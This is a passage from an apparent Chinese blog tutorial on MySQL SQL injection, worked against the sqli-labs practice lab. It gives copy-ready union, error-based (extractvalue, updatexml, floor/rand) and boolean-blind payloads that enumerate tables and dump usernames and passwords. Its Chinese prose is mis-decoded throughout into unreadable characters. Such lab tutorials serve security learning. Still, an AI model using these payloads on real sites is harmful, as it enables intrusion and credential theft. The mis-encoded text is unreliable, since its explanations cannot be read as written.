alt=""></p><ul><li>åˆ¤æ–­æ˜¾ç¤ºä½</li></ul><p>ä»¥ä¸‹ä¸ºunionæ³¨å…¥ä¸­è¾ƒä¸ºå¸¸ç”¨çš„ä¸€äº›å‡½æ•°å’Œç¯å¢ƒå˜é‡</p><div class="table-container"><table><thead><tr><th>åç§°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>version()</td><td>MySQL ç‰ˆæœ¬</td></tr><tr><td>user()</td><td>å½“å‰æ•°æ®åº“ç”¨æˆ·å</td></tr><tr><td>database()</td><td>å½“å‰æ•°æ®åº“å</td></tr><tr><td>@@version_compile_os</td><td>æ“ä½œç³»ç»Ÿç‰ˆæœ¬</td></tr><tr><td>@@datadir</td><td>æ•°æ®åº“è·¯å¾„</td></tr></tbody></table></div><p>æ¥ä¸‹æ¥æµ‹è¯•æˆ‘ä»¬çš„è¾“å…¥ä¼šåœ¨å±å¹•å“ªä¸ªåœ°æ–¹è¿›è¡Œå›æ˜¾ã€‚ä¸Šé¢æˆ‘ä»¬åˆ¤æ–­å‡ºæ¥äº†è¡¨ä¸­æœ‰3åˆ—ï¼Œæ‰€ä»¥union selectçš„æ—¶å€™å°±å†™xx,xx,xxä¸‰ä¸ªæ•°æ®</p><p>éœ€è®©<code>union select</code>å‰é¢çš„å‚æ•°æŸ¥ä¸å‡ºæ¥è€Œå›æ˜¾åé¢çš„è¯­å¥ï¼Œæ‰€ä»¥<code>id=-1&#39;</code></p><p><code>?id=-1&#39; union select 1,2,3 --+</code></p><p>å¦‚ä¸‹ï¼Œåœ¨nameå’Œpasswordå€¼ä¸­å›æ˜¾äº†æˆ‘ä»¬çš„è¾“å…¥ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨å›æ˜¾2æˆ–3çš„æ”¾ç½®æ”¾å…¥æµ‹è¯•è¯­å¥</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_06.png" alt=""></p><ul><li>çˆ†å½“å‰æ•°æ®åº“åå­—</li></ul><p><code>?id=-1&#39; union select 1,2,database() --+</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_07.png" alt=""></p><ul><li>çˆ†å½“å‰æ•°æ®åº“ä¸­çš„è¡¨</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ç›´æ¥å¥—ç”¨è¯­å¥</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­å­˜åœ¨4ä¸ªè¡¨<code>emails,referers,uagents,users</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_08.png" alt=""></p><ul><li>çˆ†è¡¨ä¸­çš„å­—æ®µ</li></ul><p>æˆ‘ä»¬è¿™é‡Œé€‰æ‹©usersè¡¨è¿›è¡Œè¿›ä¸€æ­¥çš„è·å–è¡¨ä¸­çš„å­—æ®µä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#åªéœ€æŒ‡å®šè¡¨åå³å¯</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">#æˆ–è€…æŒ‡å®šå½“å‰æ•°æ®åº“å</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>è·å–<code>users</code>è¡¨ä¸­å­˜åœ¨3ä¸ªå­—æ®µï¼Œåˆ†åˆ«ä¸º<code>id,username,password</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_09.png" alt=""></p><ul><li>çˆ†ç›¸åº”å­—æ®µçš„æ‰€æœ‰æ•°æ®</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#åªéœ€æŒ‡å®šè¡¨åå’Œå­—æ®µå</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(`id`,&#x27;</span>:<span class="string">&#x27;,`username`,&#x27;</span>:<span class="string">&#x27;,`password`) from users --+</span></span><br><span class="line"><span class="string">#å­—æ®µå€¼ä¸åŠ åå¼•å·ä¹Ÿå¯ä»¥</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="string">&#x27;:&#x27;</span>,username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_10.png" alt=""></p><p>è‡³æ­¤ï¼Œè”åˆæŸ¥è¯¢æ•´ä¸ªè¿‡ç¨‹ç»“æŸã€‚æ³¨å…¥çš„æ—¶å€™æ‰¾åˆ°æ³¨å…¥ç‚¹ååªéœ€å¥—å…¥è¯­å¥å³å¯ã€‚</p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>   æŠ¥é”™æ³¨å…¥ç”¨åœ¨æ•°æ®åº“çš„é”™è¯¯ä¿¡æ¯ä¼šå›æ˜¾åœ¨ç½‘é¡µä¸­çš„æƒ…å†µï¼Œå¦‚æœè”åˆæŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ï¼Œé¦–é€‰æŠ¥é”™æ³¨å…¥ã€‚<br>    æŠ¥é”™æ³¨å…¥åˆ©ç”¨çš„æ˜¯æ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯å¾—åˆ°æ•°æ®åº“çš„å†…å®¹ï¼Œè¿™é‡Œéœ€è¦æ„é€ è¯­å¥è®©æ•°æ®åº“æŠ¥é”™ã€‚</p><p>â€‹    æ¨èä¸‰ç§æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•ï¼Œç›´æ¥å¥—ç”¨å°±è¡Œã€‚ä»¥less-1ä¸ºä¾‹å­</p><ul><li>group by é‡å¤é”®å†²</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> æŸ¥è¯¢çš„å†…å®¹ <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>æäº¤å¦‚ä¸‹ï¼Œè·å–æ•°æ®åº“åå­—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_11.png" alt=""></p><ul><li>extractvalue() å‡½æ•°</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure><p>æäº¤<code>?id=1&#39; and extractvalue(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;)) --+</code>è·å–æ•°æ®åº“åå­—</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_12.png" alt=""></p><ul><li>updatexml() å‡½æ•°</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(éœ€è¦æŸ¥è¯¢çš„å†…å®¹),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>æäº¤å¦‚ä¸‹ï¼Œè·å–æ•°æ®åº“åå­—</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_13.png" alt=""></p><p><strong>è·å–å½“å‰æ•°æ®åº“ä¸­è¡¨çš„åå­—</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_14.png" alt=""></p><p>è¿™é‡Œæ˜¯è¯´è¦æ˜¾ç¤ºçš„å†…å®¹è¶…è¿‡ä¸€è¡Œå®ƒä¸èƒ½æ˜¾ç¤ºé‚£ä¹ˆå¤šï¼Œæ‰€ä»¥åœ¨<code>table_schema=&#39;security&#39;</code>ååŠ ä¸Š <code>limit 0,1</code>ï¼Œæ˜¾ç¤ºç¬¬ä¸€è¡Œï¼ˆæ˜¾ç¤ºç¬¬0è¡Œçš„å¾€ä¸‹ä¸€è¡Œï¼Œä¸åŒ…æ‹¬ç¬¬0è¡Œï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_15.png" alt=""></p><p>å¦‚æœè¦çœ‹ç¬¬äºŒè¡Œåˆ™ï¼Œ<code>limit1,1</code>ï¼ˆç¬¬ä¸€è¡Œçš„å¾€ä¸‹ä¸€è¡Œï¼Œä¸åŒ…æ‹¬ç¬¬ä¸€è¡Œï¼Œå³æ˜¾ç¤ºç¬¬äºŒè¡Œï¼‰ï¼Œçœ‹ç¬¬ä¸‰è¡Œåˆ™<code>limit2,1</code>ï¼Œä»¥è¿™ä¸ªæ–¹æ³•è·å–ç¬¬å››ä¸ªè¡¨ä¸º<code>users</code></p><p><strong>çˆ†è¡¨ä¸­çš„å­—æ®µ</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1 ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_16.png" alt=""></p><p>æ€»å…±çˆ†å‡ºçš„å­—æ®µä¸ºï¼š <code>id , username , password</code></p><p><strong>çˆ†å­—æ®µä¸­çš„å†…å®¹</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p>ä¸‰ç»„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_17.png" alt=""></p><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p> å¸ƒå°”ç›²æ³¨ï¼Œå³åœ¨é¡µé¢æ²¡æœ‰é”™è¯¯å›æ˜¾æ—¶å®Œæˆçš„æ³¨å…¥æ”»å‡»ã€‚æ­¤æ—¶æˆ‘ä»¬è¾“å…¥çš„è¯­å¥è®©é¡µé¢å‘ˆç°å‡ºä¸¤ç§çŠ¶æ€ï¼Œç›¸å½“äºtrueå’Œfalseï¼Œæ ¹æ®è¿™ä¸¤ç§çŠ¶æ€å¯ä»¥åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„è¯­å¥æ˜¯å¦æŸ¥è¯¢æˆåŠŸã€‚ä»¥less-8å…³ä¸ºä¾‹</p><p><strong>æˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„idï¼Œæ˜¾ç¤ºYou are in â€¦..</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_18.png" alt=""></p><p>æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„è¯­å¥å¦‚<code>id=1&#39;</code> ï¼Œæˆ–è€…<code>id=-1</code>æ—¶ï¼Œå°±ä»€ä¹ˆéƒ½ä¸æ˜¾ç¤ºã€‚è¿™å°±æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œå±å¹•ä¸Šèƒ½å¾—åˆ°ä¿¡æ¯ä¸å¤šï¼Œå°±æ˜¯ä¸¤ç§çŠ¶æ€</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_19.png" alt=""></p><p>æºç å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1 &quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"> </span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    ï½</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æ„é€ åˆ¤æ–­è¯­å¥ï¼Œæ ¹æ®é¡µé¢æ˜¯å¦å›æ˜¾è¯å®çŒœæƒ³ã€‚ä¸€èˆ¬ç”¨åˆ°çš„å‡½æ•°<code>ascii() ã€substr() ã€length()ï¼Œexists()ã€concat()</code>ç­‰ã€‚</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_20.png" alt=""></p><p><strong>åˆ¤æ–­æ•°æ®åº“ç±»å‹</strong></p><ul><li>MySQLæ•°æ®åº“è¡¨   information_schema.tables</li><li>access           msysobjects </li><li>SQLServer        sysobjects</li></ul><p>ç”¨ä¸‹çš„è¯­å¥åˆ¤æ–­æ•°æ®åº“ã€‚å“ªä¸ªé¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œå°±å±äºå“ªä¸ªæ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ Mysqlæ•°æ®åº“</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) --+</span></span><br><span class="line"><span class="string">//åˆ¤æ–­æ˜¯å¦æ˜¯ accessæ•°æ®åº“</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ Sqlserveræ•°æ®åº“</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_21.png" alt=""></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_22.png" alt=""></p><p>æ‰€ä»¥å½“å‰æ•°æ®åº“ä¸ºmysqlæ•°æ®åº“</p><p><strong>åˆ¤æ–­å½“å‰æ•°æ®åº“å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ï¼šåˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦ï¼Œåˆ©ç”¨äºŒåˆ†æ³•</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 --+  //æ­£å¸¸æ˜¾ç¤º</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">10</span> <span class="comment">--+  //ä¸æ˜¾ç¤ºä»»ä½•æ•°æ®</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;7 --+  //æ­£å¸¸æ˜¾ç¤º</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">8</span> <span class="comment">--+  //ä¸æ˜¾ç¤ºä»»ä½•æ•°æ®</span></span><br><span class="line"> </span><br><span class="line">å¤§äº<span class="number">7</span>æ­£å¸¸æ˜¾ç¤ºï¼Œå¤§äº<span class="number">8</span>ä¸æ˜¾ç¤ºï¼Œè¯´æ˜å¤§äº<span class="number">7</span>è€Œä¸å¤§äº<span class="number">8</span>ï¼Œæ‰€ä»¥å¯çŸ¥å½“å‰æ•°æ®åº“é•¿åº¦ä¸º<span class="number">8</span>ä¸ªå­—ç¬¦</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>ï¼šåˆ¤æ–­å½“å‰æ•°æ®åº“çš„å­—ç¬¦,å’Œä¸Šé¢çš„æ–¹æ³•ä¸€æ ·ï¼Œåˆ©ç”¨äºŒåˆ†æ³•ä¾æ¬¡åˆ¤æ–­</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100ä¸ºasciiè¡¨ä¸­çš„åè¿›åˆ¶ï¼Œå¯¹åº”å­—æ¯s</span></span><br><span class="line"><span class="string">//åˆ¤æ–­æ•°æ®åº“çš„ç¬¬äºŒä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ•°æ®åº“çš„ç¬¬ä¸‰ä¸ªå­—ç¬¦</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span></span><br><span class="line"><span class="string">...........</span></span><br><span class="line"><span class="string">ç”±æ­¤å¯ä»¥åˆ¤æ–­å‡ºå½“å‰æ•°æ®åº“ä¸º security</span></span><br></pre></td></tr></table></figure><p><strong>åˆ¤æ–­å½“å‰åº“çš„è¡¨å</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>çŒœæµ‹å½“å‰æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨adminè¡¨</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from admin) --+</span></span><br><span class="line"><span class="string">1ï¼šåˆ¤æ–­å½“å‰æ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•°</span></span><br><span class="line"><span class="string">// åˆ¤æ–­å½“å‰æ•°æ®åº“ä¸­çš„è¡¨çš„ä¸ªæ•°æ˜¯å¦å¤§äº5ï¼Œç”¨äºŒåˆ†æ³•ä¾æ¬¡åˆ¤æ–­ï¼Œæœ€åå¾—çŸ¥å½“å‰æ•°æ®åº“è¡¨çš„ä¸ªæ•°ä¸º4</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>ï¼šåˆ¤æ–­æ¯ä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦ï¼Œç”¨äºŒåˆ†æ³•ä¾æ¬¡åˆ¤æ–­ï¼Œæœ€åå¯çŸ¥å½“å‰æ•°æ®åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦ä¸º<span class="number">6</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span></span><br><span class="line"><span class="string">//åˆ¤æ–­ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦ï¼Œç”¨äºŒåˆ†æ³•ä¾æ¬¡åˆ¤æ–­ï¼Œæœ€åå¯çŸ¥å½“å‰æ•°æ®åº“ä¸­ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦ä¸º6</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">3</span>ï¼šåˆ¤æ–­æ¯ä¸ªè¡¨çš„æ¯ä¸ªå­—ç¬¦çš„asciiå€¼</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦çš„asciiå€¼               </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">.........</span><br><span class="line">ç”±æ­¤å¯åˆ¤æ–­å‡ºå­˜åœ¨è¡¨ emailsã€referersã€uagentsã€users ï¼ŒçŒœæµ‹usersè¡¨ä¸­æœ€æœ‰å¯èƒ½å­˜åœ¨è´¦æˆ·å’Œå¯†ç ï¼Œæ‰€ä»¥ä»¥ä¸‹åˆ¤æ–­å­—æ®µå’Œæ•°æ®åœ¨ users è¡¨ä¸­åˆ¤æ–­</span><br></pre></td></tr></table></figure><p><strong>åˆ¤æ–­è¡¨çš„å­—æ®µ</strong></p><ul><li>åˆ¤æ–­å­—æ®µä¸ªæ•°</li><li>åˆ¤æ–­æ¯ä¸ªå­—æ®µçš„é•¿åº¦</li><li>çŒœæ¯ä¸ªå­—æ®µçš„å­—ç¬¦</li></ul><figure 